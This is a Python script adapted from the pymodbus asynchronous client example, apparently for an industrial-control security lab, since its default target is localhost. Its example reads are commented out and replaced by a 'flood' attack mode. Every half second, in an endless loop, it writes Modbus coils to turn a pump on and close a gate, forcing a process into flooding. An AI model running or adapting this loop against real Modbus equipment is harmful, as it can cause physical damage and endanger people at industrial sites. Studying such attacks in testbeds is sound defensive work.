#!/usr/bin/env python3
"""Pymodbus asynchronous client example.

usage::

    client_async.py [-h] [-c {tcp,udp,serial,tls}]
                    [-f {ascii,rtu,socket,tls}]
                    [-l {critical,error,warning,info,debug}] [-p PORT]
                    [--baudrate BAUDRATE] [--host HOST]

    -h, --help
        show this help message and exit
    -c, -comm {tcp,udp,serial,tls}
        set communication, default is tcp
    -f, --framer {ascii,rtu,socket,tls}
        set framer, default depends on --comm
    -l, --log {critical,error,warning,info,debug}
        set log level, default is info
    -p, --port PORT
        set port
    --baudrate BAUDRATE
        set serial device baud rate
    --host HOST
        set host, default is 127.0.0.1

The corresponding server must be started before e.g. as:
    python3 server_sync.py
"""
from __future__ import annotations

import asyncio
import logging
import sys


try:
    import helper  # type: ignore[import-not-found]
except ImportError:
    print("*** ERROR --> THIS EXAMPLE needs the example directory, please see \n\
          https://pymodbus.readthedocs.io/en/latest/source/examples.html\n\
          for more information.")
    sys.exit(-1)

import pymodbus.client as modbusClient


_logger = logging.getLogger(__file__)
_logger.setLevel("DEBUG")


def setup_async_client(description: str | None =None, cmdline: str | None = None) -> modbusClient.ModbusBaseClient:
    """Run client setup."""
    global args
    args = helper.get_commandline(
        server=False, description=description, cmdline=cmdline
    )
    _logger.info("### Create client object")
    client: modbusClient.ModbusBaseClient | None = None
    if args.comm == "tcp":
        client = modbusClient.AsyncModbusTcpClient(
            args.host,
            port=args.port,  # on which port
            # Common optional parameters:
            framer=args.framer,
            timeout=args.timeout,
            retries=3,
            reconnect_delay=1,
            reconnect_delay_max=10,
            #    source_address=("localhost", 0),
        )
    elif args.comm == "udp":
        client = modbusClient.AsyncModbusUdpClient(
            args.host,
            port=args.port,
            # Common optional parameters:
            framer=args.framer,
            timeout=args.timeout,
            #    retries=3,
            # UDP setup parameters
            #    source_address=None,
        )
    elif args.comm == "serial":
        client = modbusClient.AsyncModbusSerialClient(
            args.port,
            # Common optional parameters:
            #    framer=FramerType.RTU,
            timeout=args.timeout,
            #    retries=3,
            # Serial setup parameters
            baudrate=args.baudrate,
            #    bytesize=8,
            #    parity="N",
            #    stopbits=1,
            #    handle_local_echo=False,
        )
    elif args.comm == "tls":
        client = modbusClient.AsyncModbusTlsClient(
            args.host,
            port=args.port,
            # Common optional parameters:
            framer=args.framer,
            timeout=args.timeout,
            #    retries=3,
            # TLS setup parameters
            sslctx=modbusClient.AsyncModbusTlsClient.generate_ssl(
                certfile=helper.get_certificate("crt"),
                keyfile=helper.get_certificate("key"),
            #    password="none",
            ),
        )
    else:
        raise RuntimeError(f"Unknown commtype {args.comm}")
    return client


async def run_async_client(client, modbus_calls=None):
    """Run sync client."""
    _logger.info("### Client starting")
    await client.connect()
    assert client.connected
    if modbus_calls:
        await modbus_calls(client, args.attack)
    client.close()
    _logger.info("### End of Program")


async def run_a_few_calls(client, attack):
    """Test connection works."""
    device_id = 0

    while True:
        await asyncio.sleep(0.5)

        if attack == 'flood':
            # rr = await client.read_coils(0, count=2, device_id=device_id)
            # print(rr.bits)
            # rr = await client.read_input_registers(0, count=1, device_id=device_id)
            # print(rr.registers)

            # turn on the pump and close the gate
            rr = await client.write_coils(0,[1,0], device_id=device_id)

        # txt = f"updating_task: incremented values: {values!s} at address {address!s}"
        # print(txt)
        # _logger.debug(txt)


async def main(cmdline=None):
    """Combine setup and run."""
    testclient = setup_async_client(description="Run client.", cmdline=cmdline)
    await run_async_client(testclient, modbus_calls=run_a_few_calls)
    # task.cancel()


if __name__ == "__main__":
    asyncio.run(main(), debug=True)
